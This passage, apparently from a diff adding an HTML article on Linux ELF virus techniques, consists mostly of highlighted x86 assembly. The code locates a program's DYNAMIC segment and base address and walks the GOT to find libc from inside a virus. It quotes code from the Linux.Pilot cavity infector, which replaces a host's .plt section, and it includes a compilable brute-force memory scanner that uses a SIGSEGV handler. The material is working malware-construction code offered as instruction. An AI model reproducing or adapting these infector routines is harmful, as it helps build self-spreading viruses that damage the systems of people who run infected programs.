+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">12</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">lodsd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn&nbsp; &nbsp; <span style="color: #ff0000;">8</span><br/>
+<span style="color: black; font-style: italic;">; uint64_t get_dyn_file_base(elf_file) return VA of DYNAMIC and lowest VA in ELF file</span><br/>
+get_dyn_file_base<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">36</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movzx</span> &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> e_phnum<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> e_phoff<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cdq</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> p_type<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> PT_LOAD<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>more<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> p_vaddr<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jae</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>more<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> p_vaddr<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>more<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> PT_DYNAMIC<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>next<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> p_vaddr<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>next<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">32</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>fail<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>fail<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">28</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">20</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn&nbsp; &nbsp; <span style="color: #ff0000;">4</span><br/>
+&nbsp;</div>
+<p>Since Linux.Pilot is a cavity infector which replaces the .plt section with iself, it doesn't need the first call to <code>unwind</code>. It will grab the GOT+8 address from the PLT directly:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_plt<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>_GLOBAL_OFFSET_TABLE_ <span style="color: #339933;">+</span> <span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>_GLOBAL_OFFSET_TABLE_ <span style="color: #339933;">+</span> <span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
+<span style="color: black; font-style: italic;">; virus begins from the first PLT entry</span><br/>
+<span style="color: black; font-style: italic;">; calculate the address of virus and substract eight from it</span><br/>
+<span style="color: black; font-style: italic;">; to fetch the GOT+8 offset from the jmp instruction above</span><br/>
+main<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #339933;">.</span>l0<br/>
+<span style="color: #339933;">.</span>l0<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #339933;">.</span>l0 <span style="color: #339933;">-</span> main<span style="color: black;">&#41;</span><br/>
+<span style="color: black; font-style: italic;">; instead of this</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; GOT + 8</span><br/>
+<span style="color: black; font-style: italic;">; you may use unwind here:</span><br/>
+<span style="color: black; font-style: italic;">; mov &nbsp; eax, ebp</span><br/>
+<span style="color: black; font-style: italic;">; call&nbsp; unwind</span><br/>
+<span style="color: black; font-style: italic;">; lea &nbsp; ebx, [ecx + 8]</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; GOT[2] - _dl_runtime_resolve</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>lazy<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; address is empty, LD_BIND_NOW is set?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; use GOT[4], hope that this is libc...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; this should be checked</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>bnow<br/>
+<span style="color: #339933;">.</span>lazy<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; unwind<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">16</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; GOT[4] - address of libc' function </span><br/>
+<span style="color: #339933;">.</span>bnow<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; unwind&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; within interp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; now we have</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; esi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - libc' DYNAMIC</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; edi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - libc' delta</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - libc' GOT</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp;</div>
+<h2>Brute force</h2>
+<p>The address of the loaded ELF files could be found by brute force search. We can install signal handler to catch the SIGSEGV (which will raise on invalid memory references) and look through the whole address space of the process. Since libc library is larger than 1Mb we can increase the step of the search to fasten the search. The code below will work both on 2.4 and 2.6:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; compile with nasm -f elf search.asm -o search.o; gcc search.o -o search</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">BITS</span>&nbsp; &nbsp; <span style="color: #ff0000;">32</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">CPU</span> &nbsp; &nbsp; <span style="color: #ff0000;">386</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">global</span>&nbsp; main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">extern</span>&nbsp; signal<span style="color: #339933;">,</span>printf<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">section</span> <span style="color: #0000ff; font-weight: bold;">.text</span><br/>
+main<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; segv</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; 11</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; signal</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; esp, 8</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; sret<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0x4000000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; segv<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">67</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sigaction</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">11</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">0x80</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>next<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; BANG!</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0xfffff000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>down<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x464c457f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>found<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>down<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>found<span style="color: #339933;">:</span> <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; format<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; printf<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>up<span style="color: #339933;">:</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>up<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+segv<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0x34</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0x34</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1048576</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0x34</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<br/>
